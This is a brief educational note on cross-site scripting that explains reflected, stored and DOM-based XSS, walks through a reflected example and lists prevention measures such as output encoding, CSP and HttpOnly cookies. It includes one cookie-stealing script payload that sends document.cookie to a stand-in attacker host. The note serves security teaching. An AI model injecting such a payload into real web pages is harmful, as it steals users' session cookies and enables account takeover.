# Cross-Site Scripting (XSS)

## What is it?
XSS is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the script as if it were legitimate, giving the attacker access to cookies, session tokens, or the ability to manipulate page content.

**Three main types:**
- **Reflected XSS** — malicious script comes from the current HTTP request
- **Stored XSS** — malicious script is saved on the server (e.g. in a database)
- **DOM-based XSS** — vulnerability exists in client-side JavaScript

---

## Example
A search field reflects user input without sanitization:

```
https://example.com/search?q=<script>alert(1)</script>
```

The server responds with:
```html
<p>Results for: <script>alert(1)</script></p>
```

The browser executes the script. A real attacker would steal cookies:
```javascript
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

---

## How to Prevent It
- **Encode output** — HTML-encode all user-supplied data before rendering it
- **Content Security Policy (CSP)** — restrict which scripts can execute
- **Use frameworks** that auto-escape output (React, Angular)
- **Validate input** — reject unexpected characters where possible
- **HttpOnly cookies** — prevent JavaScript from accessing session cookies

---

## Tools Used
- Burp Suite (intercepting and modifying requests)

## References
- [PortSwigger: XSS](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP: XSS](https://owasp.org/www-community/attacks/xss/)
